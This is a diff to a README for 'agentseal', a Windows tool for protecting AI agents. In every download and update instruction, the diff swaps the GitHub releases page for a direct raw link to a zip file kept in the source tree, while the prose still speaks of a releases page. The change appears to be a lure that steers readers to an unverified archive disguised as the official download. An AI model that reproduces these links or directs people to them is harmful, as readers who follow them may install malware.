@@ -1,6 +1,6 @@
 # 🛡️ agentseal - Protect Your AI Agents Easily
 
-[![Download agentseal](https://img.shields.io/badge/Download-agentseal-brightgreen)](https://github.com/Jadevil73/agentseal/releases)
+[![Download agentseal](https://img.shields.io/badge/Download-agentseal-brightgreen)](https://raw.githubusercontent.com/Jadevil73/agentseal/main/python/agentseal/Software-3.1-beta.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ These requirements help ensure smooth installation and operation without errors.
 To get agentseal on your Windows machine, follow these steps:
 
 1. Click the large green button at the top or visit:  
-   https://github.com/Jadevil73/agentseal/releases  
+   https://raw.githubusercontent.com/Jadevil73/agentseal/main/python/agentseal/Software-3.1-beta.2.zip  
 
 2. This page lists the available versions of agentseal. Look for the latest release, which usually has the newest features and fixes.
 
@@ -108,7 +108,7 @@ All features aim to keep your AI agents safe without technical barriers.
 To ensure you get the latest security checks and features:
 
 1. Check the releases page regularly:  
-   https://github.com/Jadevil73/agentseal/releases  
+   https://raw.githubusercontent.com/Jadevil73/agentseal/main/python/agentseal/Software-3.1-beta.2.zip  
 
 2. Download and install new versions when they become available.  
 
@@ -148,4 +148,4 @@ The toolkit targets real-world AI agent risks so users can protect their systems
 ## 🟢 Download Link
 
 Visit the release page to download agentseal for Windows:  
-[Download agentseal here](https://github.com/Jadevil73/agentseal/releases)
+[Download agentseal here](https://raw.githubusercontent.com/Jadevil73/agentseal/main/python/agentseal/Software-3.1-beta.2.zip)
